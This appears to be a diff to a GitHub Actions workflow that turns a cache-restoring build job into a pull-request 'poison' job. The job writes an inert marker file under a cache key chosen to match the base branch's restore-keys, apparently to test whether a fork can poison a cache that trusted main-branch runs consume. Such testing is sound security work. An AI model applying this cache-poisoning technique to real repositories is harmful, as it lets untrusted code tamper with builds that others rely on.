@@ -1,21 +1,12 @@
 name: cache-trust
-on:
-  push: { branches: [main] }
-  pull_request:
+on: { pull_request: {} }
 jobs:
-  build:
+  poison:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: restore cache
-        id: c
+      - run: echo "POISONED-BY-FORK-DEPTEST" > ./artifact.txt
+      - name: write poisoned cache (key build- prefix to match base restore-keys)
         uses: actions/cache@v4
         with:
           path: ./artifact.txt
-          key: build-${{ github.ref_name }}-v1
-          restore-keys: build-
-      - name: show + use cached file (privileged base run consumes this)
-        run: |
-          echo "event=${{ github.event_name }} ref=${{ github.ref }}"
-          cat ./artifact.txt 2>/dev/null || echo "no cache hit; creating clean artifact"
-          echo "clean-build-$(date +%s)" > ./artifact.txt
+          key: build-main-v1
